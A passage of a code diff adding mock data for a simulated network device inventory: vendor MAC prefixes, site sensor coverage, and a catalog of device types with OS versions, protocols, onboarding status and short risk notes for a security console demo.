+  'Lantronix':'00-20-4A', 'Raritan':'00-0D-5D', 'Vertiv':'00-E0-86', 'Cradlepoint':'00-30-44',
+  'Sierra Wireless':'00-14-3E',
+  'Dell Inc.':'A4-83-E7', 'Dell EMC':'00-1D-09', 'Hewlett Packard Enterprise':'3C-D9-2B',
+  'HP Inc.':'3C-52-82', 'Lenovo':'50-7B-9D', 'Apple, Inc.':'F0-18-98', 'Fujitsu':'00-0B-5D',
+  'Contoso Corporation':'00-15-5D', 'VMware, Inc.':'00-50-56', 'QEMU/KVM':'52-54-00',
+  'Super Micro Computer':'00-25-90', 'Intel Corporate':'00-1B-21', 'Raspberry Pi Foundation':'B8-27-EB',
+  'Espressif Inc.':'A4-CF-12', 'NetApp':'00-A0-98', 'Synology':'00-11-32', 'QNAP Systems':'00-08-9B',
+  'Quantum Corporation':'00-E0-9E', 'Veritas Technologies':'00-1B-4F',
+  'Samsung Electronics':'8C-79-F5', 'LG Electronics':'00-1E-75', 'Sony Corporation':'00-13-A9',
+  'Google, Inc.':'F4-F5-D8', 'Amazon Technologies':'FC-A1-83', 'Roku, Inc.':'B0-A7-37',
+  'Sonos, Inc.':'00-0E-58', 'Panasonic':'00-13-49', 'Sharp Corporation':'00-1B-79',
+  'Toshiba Corporation':'00-00-39', 'Epson':'00-26-AB', 'Canon Inc.':'00-1E-8F',
+  'Xerox Corporation':'00-00-AA', 'Ricoh Company':'00-00-74', 'Brother Industries':'00-80-77',
+  'Lexmark International':'00-04-00', 'Konica Minolta':'00-20-6B', 'Kyocera':'00-C0-EE',
+  'Zebra Technologies':'00-07-4D', 'Datalogic':'00-07-80', 'Mettler-Toledo':'00-30-7B',
+  'Axis Communications':'AC-CC-8E', 'Hikvision':'44-19-B6', 'Hanwha Vision':'00-09-18',
+  'Bosch Security Systems':'00-1B-86', 'Genetec':'00-1E-C0', 'Milestone Systems':'00-1C-42',
+  'Polycom':'00-04-F2', 'Yealink':'80-5E-C0', 'Avaya':'00-04-0D', 'Mitel Networks':'08-00-0F',
+  'Grandstream Networks':'00-0B-82', 'Snom Technology':'00-04-13',
+  'Crestron Electronics':'00-10-7F', 'Extron Electronics':'00-05-A6', 'Barco':'00-04-A5',
+  'Biamp Systems':'00-19-0D', 'Shure Incorporated':'00-0E-DD', 'Logitech':'00-1F-20',
+  'Honeywell':'00-40-9D', 'Siemens':'00-0E-8C', 'Schneider Electric':'00-80-F4',
+  'Johnson Controls':'00-14-15', 'Trane Technologies':'00-25-A4', 'Distech Controls':'00-1B-C5',
+  'Tridium':'00-01-F0', 'Carrier Corporation':'00-1C-23', 'Belimo':'00-1E-4A',
+  'Signify (Philips)':'00-17-88', 'Lutron Electronics':'00-1E-C6', 'Legrand':'00-1B-99',
+  'Somfy':'00-1B-3F', 'ecobee':'44-61-32', 'Nest Labs':'18-B4-30',
+  'HID Global':'00-06-8E', 'ASSA ABLOY':'00-1C-C1', 'LenelS2':'00-14-6A',
+  'Simplex Grinnell':'00-40-0B', 'Notifier':'00-1A-9F', 'KONE':'00-1E-2A', 'Otis Elevator':'00-13-F7',
+  'APC by Schneider Electric':'00-C0-B7', 'Eaton':'00-20-85', 'Enphase Energy':'00-1D-C0',
+  'SMA Solar Technology':'00-40-AD', 'ChargePoint':'00-25-DC', 'Tesla, Inc.':'4C-FC-AA',
+  'Zscaler':'B0-B8-67', 'Citrix Systems':'00-1B-B9', 'BrightSign':'00-1C-27', 'Microsemi':'00-B0-AE',
+  'Rockwell Automation':'00-00-BC', 'Mitsubishi Electric':'00-1A-B6', 'OMRON Corporation':'00-00-0A',
+  'Beckhoff Automation':'00-01-05', 'Phoenix Contact':'00-A0-45', 'Moxa Inc.':'00-90-E8',
+  'Advantech':'00-D0-C9', 'FANUC Corporation':'00-1D-38', 'KUKA Roboter':'00-30-D6',
+  'HAAS Automation':'00-1E-3B', 'Sensata Technologies':'00-1D-5A', 'Elo Touch Solutions':'00-1B-EB',
+  'NCR Corporation':'00-00-3D', 'Verifone':'00-16-C8', 'Ingenico':'00-1C-D0',
+  '(locally administered)':'2E-91-A0',
+};
+
+// Where each site's devices live and which onboarded sensors can see them. Sensors
+// only report on their own network, so a branch asset is never "seen by" HQ.
+const FLEET_SITES = {
+  lan:  { network:'CORP-LAN',   seen:['WKS-01','WKS-03','FIN-FS-02','DC01','W10-ENG-04','W10-SALES-11'] },
+  wifi: { network:'CORP-WIFI',  seen:['WKS-01','WKS-02','W10-SALES-11','W10-SALES-12'] },
+  bms:  { network:'BMS-VLAN',   seen:['FIN-FS-02','W10-OT-BRIDGE'] },
+  br:   { network:'BRANCH-LAN', seen:['WKS-02','W10-SALES-12'] },
+};
+
+// Fixed subnets for the sites that only use one; CORP-LAN is segmented per role and
+// carries its subnet on each catalog entry instead.
+const FLEET_SITE_SUBNET = { wifi:'10.20.9', bms:'10.20.6', br:'10.20.12' };
+
+// One entry per device classification.
+//   t = device type (what the distribution chart counts)  tab = inventory tab
+//   p = name prefix   sub = CORP-LAN subnet   v = vendors   os = OS/firmware pool
+//   pr = protocols seen   ob = onboarding status   rk = risk pool   hv = high-value rate
+//   n = how many exist per site { lan, wifi, bms, br }
+const FLEET_CATALOG = [
+  // --- Endpoints, servers, storage ---
+  { t:'Workstation', tab:'computers', p:'WKS', sub:'10.20.7', n:{lan:60,br:4},
+    v:['Dell Inc.','HP Inc.','Lenovo'], os:['Windows 11 Enterprise 23H2','Windows 11 Pro 23H2','Windows 10 Enterprise 22H2'],
+    pr:['ARP','SMB','LLMNR','DHCP'], ob:'Can be onboarded', rk:['Medium','Low','Low'], hv:0,
+    note:'Desk workstation on a monitored network with no sensor reporting. Straight coverage gap.' },
+  { t:'Laptop', tab:'computers', p:'LT', sub:'10.20.7', n:{lan:18,wifi:34,br:3},
+    v:['Dell Inc.','Lenovo','HP Inc.','Apple, Inc.'], os:['Windows 11 Pro 23H2','Windows 11 Enterprise 23H2','macOS 14 Sonoma'],
+    pr:['ARP','DHCP','mDNS','SMB'], ob:'Can be onboarded', rk:['Medium','Low','Low'], hv:0,
+    note:'Roaming laptop. Seen on corporate wireless without an onboarded sensor.' },
+  { t:'Server', tab:'computers', p:'SRV', sub:'10.20.3', n:{lan:24},
+    v:['Dell Inc.','Hewlett Packard Enterprise','Super Micro Computer'], os:['Windows Server 2022','Windows Server 2019','Ubuntu Server 22.04 LTS','Red Hat Enterprise Linux 9'],
+    pr:['SMB','SSH','HTTPS','ICMP'], ob:'Can be onboarded', rk:['High','Medium','Medium'], hv:0.35,
+    note:'Unmanaged server. Server SKUs support the sensor, so this is an onboardable gap.' },
+  { t:'Hypervisor host', tab:'computers', p:'ESX', sub:'10.20.3', n:{lan:5},
+    v:['Dell Inc.','Hewlett Packard Enterprise'], os:['VMware ESXi 8.0','VMware ESXi 7.0'],
+    pr:['HTTPS','SSH','SLP','CIM'], ob:'Unsupported', rk:['High','Medium'], hv:0.8,
+    note:'Hypervisor. No Defender for Endpoint sensor exists for this platform — protect it with network controls.' },
+  { t:'Virtual machine', tab:'computers', p:'VM', sub:'10.20.3', n:{lan:16},
+    v:['VMware, Inc.','QEMU/KVM','Contoso Corporation'], os:['Ubuntu Server 22.04 LTS','Windows Server 2019','Debian 12'],
+    pr:['SSH','HTTP','ARP'], ob:'Can be onboarded', rk:['Medium','Low'], hv:0.1,
+    note:'Guest VM discovered by its own traffic. Onboard it like any other machine.' },
+  { t:'Container host', tab:'computers', p:'DOCK', sub:'10.20.3', n:{lan:4},
+    v:['Dell Inc.','Super Micro Computer'], os:['Ubuntu Server 22.04 LTS','Flatcar Container Linux'],
+    pr:['SSH','HTTPS','etcd','ARP'], ob:'Can be onboarded', rk:['High','Medium'], hv:0.4,
+    note:'Container host exposing an API port. Onboardable, and worth prioritising.' },
+  { t:'Thin client', tab:'computers', p:'TC', sub:'10.20.7', n:{lan:12,br:2},
+    v:['Dell Inc.','HP Inc.'], os:['ThinOS 2308','Windows 10 IoT Enterprise LTSC'],
+    pr:['RDP','ARP','DHCP'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
+    note:'VDI thin client. Locked-down firmware with no sensor available.' },
+  { t:'Mobile', tab:'computers', p:'MOB', sub:'10.20.9', n:{wifi:24},
+    v:['Samsung Electronics','Apple, Inc.','Google, Inc.'], os:['Android 14','iOS 17.5','Android 13'],
+    pr:['DHCP','mDNS','ARP'], ob:'Can be onboarded', rk:['Low','Medium'], hv:0,
+    note:'Handset on corporate wireless. Onboardable through the Defender mobile app.' },
+  { t:'Tablet', tab:'computers', p:'TAB', sub:'10.20.9', n:{wifi:10},
+    v:['Apple, Inc.','Samsung Electronics','Contoso Corporation'], os:['iPadOS 17.5','Android 14','Windows 11 Pro 23H2'],
+    pr:['DHCP','mDNS','HTTPS'], ob:'Can be onboarded', rk:['Low','Informational'], hv:0,
+    note:'Shared floor tablet. No sensor, no policy, full corporate wireless access.' },
+  { t:'Rugged handheld', tab:'computers', p:'RGD', sub:'10.20.9', n:{wifi:6,br:2},
+    v:['Zebra Technologies','Datalogic','Honeywell'], os:['Android 11 (AOSP)','Android 10 (AOSP)'],
+    pr:['DHCP','HTTP','ARP'], ob:'Insufficient info', rk:['Medium','Low'], hv:0,
+    note:'Warehouse scanning handheld running a vendor Android build years behind patch level.' },
+  { t:'Point of sale terminal', tab:'computers', p:'POS', sub:'10.20.7', n:{lan:2,br:4},
+    v:['NCR Corporation','Verifone','Ingenico','Elo Touch Solutions'], os:['Windows 10 IoT Enterprise LTSC','Verifone Engage 3.4'],
+    pr:['HTTPS','ARP','SMB'], ob:'Can be onboarded', rk:['High','Medium'], hv:0.5,
+    note:'Card-present terminal. In scope for PCI and currently unmonitored.' },
+  { t:'Self-service kiosk', tab:'computers', p:'KSK', sub:'10.20.7', n:{lan:3,br:1},
+    v:['Elo Touch Solutions','HP Inc.'], os:['Windows 10 IoT Enterprise LTSC','Android 12 (AOSP)'],
+    pr:['HTTPS','ARP','DHCP'], ob:'Can be onboarded', rk:['Medium','Low'], hv:0,
+    note:'Public-facing kiosk in a lobby. Physically reachable by visitors.' },
+  { t:'NAS', tab:'computers', p:'NAS', sub:'10.20.15', n:{lan:5},
+    v:['Synology','QNAP Systems','NetApp'], os:['DSM 7.2','QTS 5.1','ONTAP 9.13'],
+    pr:['SMB','NFS','HTTPS','SNMP'], ob:'Unsupported', rk:['High','Medium'], hv:0.6,
+    note:'Network storage holding departmental shares. Appliance OS — no sensor, patch via vendor firmware.' },
+  { t:'SAN array', tab:'computers', p:'SAN', sub:'10.20.15', n:{lan:2},
+    v:['Dell EMC','NetApp'], os:['PowerStore 3.5','ONTAP 9.13'],
+    pr:['iSCSI','HTTPS','SNMP'], ob:'Unsupported', rk:['Medium'], hv:1,
+    note:'Primary block storage. High value: every production volume lives behind it.' },
+  { t:'Backup appliance', tab:'computers', p:'BKUP', sub:'10.20.15', n:{lan:2},
+    v:['Veritas Technologies','Dell EMC'], os:['NetBackup Flex 10.3','PowerProtect DD 7.10'],
+    pr:['HTTPS','SSH','NFS'], ob:'Unsupported', rk:['High'], hv:1,
+    note:'Backup target. A ransomware operator reaching this erases the recovery path.' },
+  { t:'Tape library', tab:'computers', p:'TAPE', sub:'10.20.15', n:{lan:1},
+    v:['Quantum Corporation'], os:['Scalar i3 firmware 320G'],
+    pr:['HTTPS','SNMP'], ob:'Unsupported', rk:['Low'], hv:0.5,
+    note:'Offline backup library. Management interface reachable from the server VLAN.' },
+  { t:'Unknown', tab:'computers', p:'UNK', sub:'10.20.7', n:{lan:4,wifi:6,br:1},
+    v:['(locally administered)'], os:['Unknown'],
+    pr:['ARP'], ob:'Insufficient info', rk:['Informational'], hv:0,
+    note:'Randomized MAC seen briefly. Too little traffic for discovery to classify it.' },
+
+  // --- Network devices ---
+  { t:'Switch', tab:'network', p:'SW', sub:'10.20.0', n:{lan:26,br:3,bms:1},
+    v:['Cisco Systems','Aruba Networks','Juniper Networks'], os:['Cisco IOS-XE 17.9','ArubaOS-CX 10.11','Junos 21.4'],
+    pr:['SNMP','CDP','LLDP','SSH'], ob:'Unsupported', rk:['Medium','Low'], hv:0.2,
+    note:'Access switch. Assessed by authenticated SNMP scan rather than an agent.' },
+  { t:'Router', tab:'network', p:'RTR', sub:'10.20.0', n:{lan:4,br:1},
+    v:['Cisco Systems','Juniper Networks','MikroTik'], os:['Cisco IOS-XE 17.6','Junos 21.4','RouterOS 7.13'],
+    pr:['SNMP','BGP','SSH','LLDP'], ob:'Unsupported', rk:['High','Medium'], hv:0.6,
+    note:'Routed hop between segments. Firmware currency drives its risk level.' },
+  { t:'Firewall', tab:'network', p:'FW', sub:'10.20.0', n:{lan:3,br:1},
+    v:['Fortinet','Palo Alto Networks','Cisco Systems'], os:['FortiOS 7.4','PAN-OS 11.0','Cisco ASA 9.18'],
+    pr:['SNMP','HTTPS','SSH'], ob:'Unsupported', rk:['High','Medium'], hv:0.8,
+    note:'Enforcement point for a segment boundary. Patch through the network team.' },
+  { t:'WLAN controller', tab:'network', p:'WLC', sub:'10.20.0', n:{lan:2},
+    v:['Cisco Systems','Aruba Networks'], os:['Cisco IOS-XE 17.9 (C9800)','ArubaOS 8.11'],
+    pr:['SNMP','CAPWAP','HTTPS'], ob:'Unsupported', rk:['Medium','Low'], hv:0.5,
+    note:'Wireless controller. Owns the association state for every corporate AP.' },
+  { t:'Wireless access point', tab:'network', p:'AP', sub:'10.20.0', n:{lan:24,br:3},
+    v:['Cisco Meraki','Aruba Networks','Ubiquiti Networks','Ruckus Networks'], os:['Meraki MR 30.6','ArubaOS 8.11','UniFi 7.4'],
+    pr:['CAPWAP','LLDP','SNMP','mDNS'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
+    note:'Ceiling access point serving CORP-WIFI.' },
+  { t:'Load balancer', tab:'network', p:'LB', sub:'10.20.0', n:{lan:3},
+    v:['F5 Networks','Citrix Systems'], os:['BIG-IP 17.1','NetScaler 14.1'],
+    pr:['HTTPS','SNMP','SSH'], ob:'Unsupported', rk:['High','Medium'], hv:0.7,
+    note:'Application delivery controller terminating TLS for internal apps.' },
+  { t:'VPN gateway', tab:'network', p:'VPNGW', sub:'10.20.0', n:{lan:2},
+    v:['Palo Alto Networks','Fortinet'], os:['PAN-OS 11.0','FortiOS 7.4'],
+    pr:['IPsec','HTTPS','SNMP'], ob:'Unsupported', rk:['High'], hv:1,
+    note:'Remote-access concentrator. Internet-reachable and a standing initial-access target.' },
+  { t:'Proxy appliance', tab:'network', p:'PROXY', sub:'10.20.0', n:{lan:2},
+    v:['Zscaler','Barracuda Networks'], os:['Zscaler CC 6.2','Barracuda WSG 15.0'],
+    pr:['HTTP','HTTPS','SNMP'], ob:'Unsupported', rk:['Medium'], hv:0.5,
+    note:'Forward proxy. Egress for most of the estate flows through it.' },
+  { t:'Email security gateway', tab:'network', p:'ESG', sub:'10.20.0', n:{lan:1},
+    v:['Barracuda Networks','Cisco Systems'], os:['Barracuda ESG 9.2','Cisco AsyncOS 15.5'],
+    pr:['SMTP','HTTPS','SNMP'], ob:'Unsupported', rk:['High'], hv:0.5,
+    note:'Mail gateway appliance. Historically a heavily exploited class of device.' },
+  { t:'Web filter appliance', tab:'network', p:'WEBFLT', sub:'10.20.0', n:{lan:1},
+    v:['Fortinet'], os:['FortiWeb 7.4'], pr:['HTTPS','SNMP'], ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'URL filtering appliance sitting in front of the proxy tier.' },
+  { t:'DNS appliance', tab:'network', p:'DNSAPP', sub:'10.20.0', n:{lan:2},
+    v:['Infoblox'], os:['NIOS 9.0'], pr:['DNS','DHCP','SNMP','HTTPS'], ob:'Unsupported', rk:['Medium'], hv:0.8,
+    note:'DDI appliance answering internal DNS. Its logs are a hunting goldmine.' },
+  { t:'NTP appliance', tab:'network', p:'NTP', sub:'10.20.0', n:{lan:1},
+    v:['Microsemi'], os:['SyncServer S650 3.0'], pr:['NTP','SNMP','HTTPS'], ob:'Unsupported', rk:['Low'], hv:0.5,
+    note:'Stratum-1 time source. Clock drift here breaks authentication and log correlation.' },
+  { t:'Network TAP', tab:'network', p:'TAP', sub:'10.20.0', n:{lan:2},
+    v:['Keysight Technologies'], os:['Ixia Vision 5.9'], pr:['SNMP','HTTPS'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Passive tap feeding the monitoring stack.' },
+  { t:'Packet broker', tab:'network', p:'NPB', sub:'10.20.0', n:{lan:1},
+    v:['Gigamon'], os:['GigaVUE-OS 6.4'], pr:['SNMP','HTTPS','SSH'], ob:'Unsupported', rk:['Medium'], hv:0.5,
+    note:'Aggregates span traffic for the IDS sensors. Sees everything on the wire.' },
+  { t:'IDS sensor', tab:'network', p:'IDS', sub:'10.20.0', n:{lan:2},
+    v:['Cisco Systems','Super Micro Computer'], os:['Firepower 7.4','Suricata 7.0 (Ubuntu 22.04)'],
+    pr:['HTTPS','SSH','SNMP'], ob:'Unsupported', rk:['Low'], hv:0.5,
+    note:'Network detection sensor. Not an endpoint sensor — it sees traffic, not process activity.' },
+  { t:'SD-WAN edge', tab:'network', p:'SDWAN', sub:'10.20.0', n:{lan:1,br:2},
+    v:['Cisco Systems','Fortinet'], os:['vEdge 20.12','FortiOS 7.4 (SD-WAN)'],
+    pr:['IPsec','SNMP','HTTPS'], ob:'Unsupported', rk:['Medium'], hv:0.5,
+    note:'Branch edge device building the overlay back to HQ.' },
+  { t:'Console server', tab:'network', p:'CONS', sub:'10.20.1', n:{lan:2},
+    v:['Lantronix','Vertiv'], os:['SLC8000 8.4','ACS8000 3.3'], pr:['SSH','Telnet','SNMP','HTTPS'],
+    ob:'Unsupported', rk:['High'], hv:0.7,
+    note:'Serial console access to network gear, with Telnet still enabled. Out-of-band means out-of-EDR.' },
+  { t:'Baseboard management controller', tab:'network', p:'BMC', sub:'10.20.1', n:{lan:14},
+    v:['Dell Inc.','Hewlett Packard Enterprise','Super Micro Computer'], os:['iDRAC9 7.10','iLO 6 1.55','Supermicro BMC 1.73'],
+    pr:['HTTPS','IPMI','SSH','SNMP'], ob:'Unsupported', rk:['High','Medium'], hv:0.4,
+    note:'Server lights-out controller. Full hardware control below the operating system.' },
+  { t:'KVM switch', tab:'network', p:'KVM', sub:'10.20.1', n:{lan:2},
+    v:['Raritan','Vertiv'], os:['Dominion KX IV 4.4','Avocent ADX 4.1'], pr:['HTTPS','SNMP'],
+    ob:'Unsupported', rk:['Medium'], hv:0.5,
+    note:'Rack KVM. Console access to anything plugged into it.' },
+  { t:'Cellular gateway', tab:'network', p:'LTEGW', sub:'10.20.0', n:{lan:1,br:1},
+    v:['Cradlepoint','Sierra Wireless'], os:['NetCloud OS 7.24','ALEOS 4.17'],
+    pr:['HTTPS','SNMP','IPsec'], ob:'Unsupported', rk:['High'], hv:0.5,
+    note:'LTE failover gateway — a second path to the internet that bypasses the perimeter firewall.' },
+  { t:'Network probe', tab:'network', p:'PROBE', sub:'10.20.1', n:{lan:2},
+    v:['Super Micro Computer'], os:['Ubuntu Server 22.04 LTS (probe)'], pr:['SNMP','HTTPS','ICMP'],
+    ob:'Can be onboarded', rk:['Low'], hv:0,
+    note:'Synthetic monitoring probe. Runs a normal Linux build, so it is onboardable.' },
+  { t:'Bandwidth shaper', tab:'network', p:'SHAPER', sub:'10.20.0', n:{lan:1},
+    v:['Netgear'], os:['Traffic shaper firmware 4.2'], pr:['SNMP','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Traffic shaping appliance on the branch uplink.' },
+  { t:'Fiber media converter', tab:'network', p:'FMC', sub:'10.20.1', n:{lan:2},
+    v:['Moxa Inc.'], os:['IMC-101 firmware 1.6'], pr:['SNMP','ARP'], ob:'Unsupported', rk:['Informational'], hv:0,
+    note:'Copper-to-fibre converter between building risers.' },
+  { t:'Industrial switch', tab:'network', p:'ISW', sub:'10.20.6', n:{bms:2},
+    v:['Moxa Inc.','Phoenix Contact'], os:['MOXA EDS-508A 3.11','FL SWITCH 2.4'],
+    pr:['SNMP','LLDP','HTTP'], ob:'Unsupported', rk:['Medium'], hv:0.5,
+    note:'DIN-rail switch inside the OT cabinet. Discovered passively — the segment is excluded from active probing.' },
+
+  // --- Printing and imaging ---
+  { t:'Printer', tab:'iot', p:'PRN', sub:'10.20.5', n:{lan:10,br:1},
+    v:['HP Inc.','Brother Industries','Lexmark International'], os:['HP FutureSmart 5','Brother firmware 1.34','Lexmark eSF 6.1'],
+    pr:['IPP','PJL','SNMP','mDNS'], ob:'Unsupported', rk:['Medium','Low'], hv:0,
+    note:'Floor printer. Embedded web server reachable without authentication.' },
+  { t:'Multifunction printer', tab:'iot', p:'MFP', sub:'10.20.5', n:{lan:8,br:1},
+    v:['Xerox Corporation','Ricoh Company','Konica Minolta','Canon Inc.'], os:['Xerox AltaLink 103','Ricoh Smart Operation 3.2','bizhub i-Series 4.1'],
+    pr:['IPP','SMB','SMTP','SNMP','LDAP'], ob:'Unsupported', rk:['High','Medium'], hv:0.2,
+    note:'Scan-to-folder MFP holding stored service-account credentials in its address book.' },
+  { t:'Label printer', tab:'iot', p:'LBL', sub:'10.20.5', n:{lan:4},
+    v:['Zebra Technologies'], os:['Link-OS 6.5'], pr:['RAW-9100','SNMP','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Shipping label printer. Accepts raw print jobs on 9100 from anywhere on the VLAN.' },
+  { t:'Large-format plotter', tab:'iot', p:'PLOT', sub:'10.20.5', n:{lan:1},
+    v:['HP Inc.','Canon Inc.'], os:['DesignJet firmware 21.1'], pr:['IPP','SNMP','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Engineering plotter used for drawings.' },
+  { t:'3D printer', tab:'iot', p:'3DP', sub:'10.20.5', n:{lan:2},
+    v:['Raspberry Pi Foundation'], os:['OctoPrint 1.10 (Raspberry Pi OS)'], pr:['HTTP','mDNS','SSH'],
+    ob:'Can be onboarded', rk:['Medium'], hv:0,
+    note:'Prototyping printer driven by a single-board computer with an open web interface.' },
+  { t:'Badge card printer', tab:'iot', p:'CARDP', sub:'10.20.5', n:{lan:1},
+    v:['HID Global'], os:['Fargo DTC firmware 2.9'], pr:['RAW-9100','SNMP'], ob:'Unsupported', rk:['Medium'], hv:0.5,
+    note:'Prints physical access badges. Compromise here is a physical-security problem.' },
+
+  // --- Video surveillance ---
+  { t:'Camera', tab:'iot', p:'CAM', sub:'10.20.8', n:{lan:26,br:3},
+    v:['Axis Communications','Hikvision','Hanwha Vision','Bosch Security Systems'], os:['Axis OS 11.9','Hikvision 5.7','Wisenet 2.21'],
+    pr:['RTSP','HTTP','ONVIF','SSDP'], ob:'Unsupported', rk:['High','Medium','Low'], hv:0,
+    note:'Fixed surveillance camera. Firmware updates lag and default credentials are common.' },
+  { t:'PTZ camera', tab:'iot', p:'PTZ', sub:'10.20.8', n:{lan:6},
+    v:['Axis Communications','Hanwha Vision'], os:['Axis OS 11.9','Wisenet 2.21'],
+    pr:['RTSP','ONVIF','HTTP'], ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Pan-tilt-zoom camera covering the perimeter.' },
+  { t:'Thermal camera', tab:'iot', p:'THERM', sub:'10.20.8', n:{lan:2},
+    v:['Axis Communications','Bosch Security Systems'], os:['Axis OS 11.9','Bosch CPP7 8.0'],
+    pr:['RTSP','ONVIF','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Thermal imaging camera on the loading dock.' },
+  { t:'Network video recorder', tab:'iot', p:'NVR', sub:'10.20.8', n:{lan:2},
+    v:['Milestone Systems','Genetec'], os:['XProtect 2024 R1 (Windows Server 2019)','Security Center 5.11'],
+    pr:['RTSP','SMB','HTTPS'], ob:'Can be onboarded', rk:['High'], hv:1,
+    note:'Video recorder running Windows Server underneath — onboardable, and it holds every camera feed.' },
+  { t:'Video encoder', tab:'iot', p:'VENC', sub:'10.20.8', n:{lan:2},
+    v:['Axis Communications'], os:['Axis OS 10.12'], pr:['RTSP','HTTP','ONVIF'], ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Encoder bridging legacy analogue cameras onto the network.' },
+  { t:'License plate reader', tab:'iot', p:'LPR', sub:'10.20.8', n:{lan:1},
+    v:['Genetec'], os:['AutoVu firmware 5.11'], pr:['HTTPS','RTSP'], ob:'Unsupported', rk:['Medium'], hv:0.5,
+    note:'Car park plate reader. Stores movement records for staff vehicles.' },
+
+  // --- Audio / video / collaboration ---
+  { t:'Audio and Video', tab:'iot', p:'CODEC', sub:'10.20.5', n:{lan:8},
+    v:['Polycom','Cisco Systems','Logitech'], os:['Poly VideoOS 4.3','RoomOS 11.9','CollabOS 1.12'],
+    pr:['SIP','H.323','mDNS','HTTPS'], ob:'Unsupported', rk:['Medium','Low'], hv:0,
+    note:'Conference room codec with a camera and microphone in a meeting space.' },
+  { t:'Conference room display', tab:'iot', p:'DISP', sub:'10.20.5', n:{lan:8},
+    v:['Samsung Electronics','LG Electronics','Sharp Corporation'], os:['Tizen 7.0 (signage)','webOS Signage 6.0'],
+    pr:['SSDP','mDNS','HTTP'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
+    note:'Wall display in a meeting room, joined to the corporate network for casting.' },
+  { t:'Projector', tab:'iot', p:'PROJ', sub:'10.20.5', n:{lan:4},
+    v:['Epson','Panasonic','Barco'], os:['Epson projector firmware 2.13','PJLink firmware 3.1'],
+    pr:['PJLink','HTTP','SNMP'], ob:'Unsupported', rk:['Informational'], hv:0,
+    note:'Ceiling projector controlled over PJLink with a default password.' },
+  { t:'Digital signage player', tab:'iot', p:'SIGN', sub:'10.20.5', n:{lan:5,br:1},
+    v:['BrightSign','Samsung Electronics'], os:['BrightSign OS 9.0','Tizen 7.0 (signage)'],
+    pr:['HTTPS','mDNS','NTP'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Lobby signage player pulling content from an internet source.' },
+  { t:'Interactive whiteboard', tab:'iot', p:'IWB', sub:'10.20.5', n:{lan:3},
+    v:['Contoso Corporation','Samsung Electronics'], os:['Windows 10 Team 2022','Tizen 7.0 (Flip)'],
+    pr:['SMB','HTTPS','mDNS'], ob:'Can be onboarded', rk:['Medium'], hv:0,
+    note:'Collaboration board. The Windows Team build supports a sensor and is joined to the tenant.' },
+  { t:'Audio DSP', tab:'iot', p:'DSP', sub:'10.20.5', n:{lan:2},
+    v:['Biamp Systems','Shure Incorporated'], os:['TesiraFORTE 4.5','Shure firmware 4.2'],
+    pr:['Dante','HTTP','Telnet'], ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Room audio processor. Telnet control port open on the AV VLAN.' },
+  { t:'Wireless presentation system', tab:'iot', p:'WPS', sub:'10.20.5', n:{lan:4},
+    v:['Barco','Crestron Electronics'], os:['ClickShare 2.14','AirMedia 4.3'],
+    pr:['HTTPS','mDNS','SSDP'], ob:'Unsupported', rk:['Medium','Low'], hv:0,
+    note:'Screen-sharing base unit that bridges guest laptops onto the display network.' },
+  { t:'Streaming media player', tab:'iot', p:'STRM', sub:'10.20.5', n:{lan:2},
+    v:['Roku, Inc.','Amazon Technologies'], os:['Roku OS 13','Fire OS 7'],
+    pr:['SSDP','mDNS','HTTPS'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Media stick plugged into a breakout-area TV.' },
+  { t:'Smart TV', tab:'iot', p:'TV', sub:'10.20.5', n:{lan:2,wifi:2},
+    v:['Samsung Electronics','LG Electronics','Sony Corporation'], os:['Tizen 7.0','webOS 23','Android TV 12'],
+    pr:['SSDP','mDNS','HTTP'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
+    note:'Consumer TV on a corporate network, phoning home to vendor telemetry endpoints.' },
+  { t:'Smart speaker', tab:'iot', p:'SPKR', sub:'10.20.9', n:{wifi:3},
+    v:['Sonos, Inc.','Amazon Technologies','Google, Inc.'], os:['Sonos S2 16.2','Fire OS 8','Google Cast 1.56'],
+    pr:['mDNS','SSDP','HTTPS'], ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Always-listening consumer device someone joined to corporate wireless.' },
+  { t:'Public address controller', tab:'iot', p:'PA', sub:'10.20.5', n:{lan:1},
+    v:['Bosch Security Systems'], os:['PRAESENSA 2.5'], pr:['HTTP','SNMP','Dante'], ob:'Unsupported', rk:['Medium'], hv:0.5,
+    note:'Building-wide announcement system, including the emergency evacuation message path.' },
+  { t:'Intercom', tab:'iot', p:'ICOM', sub:'10.20.5', n:{lan:2,bms:1},
+    v:['Axis Communications','Bosch Security Systems'], os:['Axis OS 11.9 (intercom)','Bosch intercom 3.4'],
+    pr:['SIP','RTSP','HTTP'], ob:'Unsupported', rk:['Medium'], hv:0,
+    note:'Door intercom that also releases the strike on the door beside it.' },
+
+  // --- Voice ---
+  { t:'VoIP phone', tab:'iot', p:'VOIP', sub:'10.20.2', n:{lan:40,br:4},
+    v:['Yealink','Polycom','Cisco Systems','Grandstream Networks'], os:['Yealink T5 firmware 96.86','Poly UCS 8.1','Cisco IP Phone 14.2'],
+    pr:['SIP','RTP','LLDP-MED','HTTP'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
+    note:'Desk phone on the voice VLAN. Provisioning happens over unauthenticated TFTP/HTTP.' },
+  { t:'Conference phone', tab:'iot', p:'CONFP', sub:'10.20.2', n:{lan:8},
+    v:['Polycom','Yealink'], os:['Poly UCS 8.1','Yealink CP firmware 87.15'], pr:['SIP','RTP','HTTP'],
+    ob:'Unsupported', rk:['Low'], hv:0,
+    note:'Table conference phone in a meeting room.' },
+  { t:'DECT base station', tab:'iot', p:'DECT', sub:'10.20.2', n:{lan:3},
+    v:['Snom Technology','Yealink'], os:['Snom M900 firmware 6.1','Yealink W80 firmware 103.3'],
+    pr:['SIP','RTP','HTTPS'], ob:'Unsupported', rk:['Medium'], hv:0,
